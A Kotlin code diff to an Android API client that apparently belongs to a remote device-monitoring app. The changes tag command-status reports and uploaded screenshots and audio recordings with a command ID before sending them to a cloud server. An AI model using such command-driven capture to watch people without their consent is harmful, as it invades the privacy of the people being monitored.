@@ -558,14 +558,19 @@ object ApiClient {
     }
 
     fun updateCommandStatus(commandId: String, status: String): Boolean {
-        return updateCommandStatus(commandId, status, null)
+        return updateCommandStatus(commandId, status, null, null)
     }
 
     fun updateCommandStatus(commandId: String, status: String, result: String?): Boolean {
+        return updateCommandStatus(commandId, status, result, null)
+    }
+
+    fun updateCommandStatus(commandId: String, status: String, result: String?, resultType: String?): Boolean {
         return try {
             val payload = JSONObject().apply {
                 put("status", status)
                 if (result != null) put("result", result)
+                if (resultType != null) put("result_type", resultType)
             }
             val response = client.newCall(
                 buildRequest(
@@ -688,20 +693,20 @@ object ApiClient {
         data class Error(val message: String) : Result()
     }
 
-    fun uploadScreenshot(file: java.io.File): Boolean {
+    fun uploadScreenshot(file: java.io.File, commandId: String? = null): Boolean {
         return try {
             val mediaType = "image/jpeg".toMediaType()
-            val requestBody = MultipartBody.Builder()
+            val bodyBuilder = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("device_id", CloudConfig.deviceId)
                 .addFormDataPart("media_type", "screenshot")
                 .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
-                .build()
+            if (commandId != null) bodyBuilder.addFormDataPart("command_id", commandId)
 
             val request = Request.Builder()
                 .url("${CloudConfig.apiBaseUrl}/report/media")
                 .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
-                .post(requestBody)
+                .post(bodyBuilder.build())
                 .build()
 
             val response = client.newCall(request).execute()
@@ -711,20 +716,20 @@ object ApiClient {
         }
     }
 
-    fun uploadAudioFile(file: java.io.File): Boolean {
+    fun uploadAudioFile(file: java.io.File, commandId: String? = null): Boolean {
         return try {
             val mediaType = "audio/mp4".toMediaType()
-            val requestBody = MultipartBody.Builder()
+            val bodyBuilder = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("device_id", CloudConfig.deviceId)
                 .addFormDataPart("media_type", "audio")
                 .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
-                .build()
+            if (commandId != null) bodyBuilder.addFormDataPart("command_id", commandId)
 
             val request = Request.Builder()
                 .url("${CloudConfig.apiBaseUrl}/report/media")
                 .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
-                .post(requestBody)
+                .post(bodyBuilder.build())
                 .build()
 
             val response = client.newCall(request).execute()
